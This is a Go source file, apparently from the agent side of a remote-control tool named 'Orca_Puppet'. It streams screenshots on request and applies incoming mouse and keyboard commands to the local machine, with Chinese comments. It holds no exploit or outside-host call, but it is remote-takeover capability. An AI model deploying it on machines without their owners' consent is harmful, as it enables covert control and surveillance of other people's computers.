package controller

import (
	"Orca_Puppet/cli/cmdopt/rdesktopopt"
	"Orca_Puppet/cli/common/setchannel"
	"Orca_Puppet/define/debug"
	"time"
)

func screenStreamCmd(sendUserId string) {
	// 初始化远程桌面获取下一张截图通道
	nextScreenChan, exist := setchannel.GetNextScreenChan(sendUserId)
	if !exist {
		nextScreenChan = make(chan string)
		setchannel.AddNextScreenChan(sendUserId, nextScreenChan)
	}
	// 初始化鼠标动作通道
	mouseActionChan, exist := setchannel.GetMouseActionChan(sendUserId)
	if !exist {
		mouseActionChan = make(chan string)
		setchannel.AddMouseActionChan(sendUserId, mouseActionChan)
	}
	// 初始化键盘动作通道
	keyboardActionChan, exist := setchannel.GetKeyboardActionChan(sendUserId)
	if !exist {
		keyboardActionChan = make(chan string)
		setchannel.AddKeyboardActionChan(sendUserId, keyboardActionChan)
	}

	// 等待鼠标动作
	go func() {
		select {
		case message := <-mouseActionChan:
			mouseInfo := rdesktopopt.GetMouseInfo(message)
			rdesktopopt.SettleMouseAction(mouseInfo)
		}
	}()
	// 等待键盘动作
	go func() {
		select {
		case message := <-keyboardActionChan:
			keyboardInfo := rdesktopopt.GetKeyboardInfo(message)
			rdesktopopt.SettleKeyboardAction(keyboardInfo)
		}
	}()

	select {
	case <-time.After(time.Second):
		debug.DebugPrint("error desktop")
		return
	case <-nextScreenChan:
		screenCmd(sendUserId)
	}
}

func sendScreenSizeCmd(clientId string) {
	rdesktopopt.SendScreenSize(clientId)
}
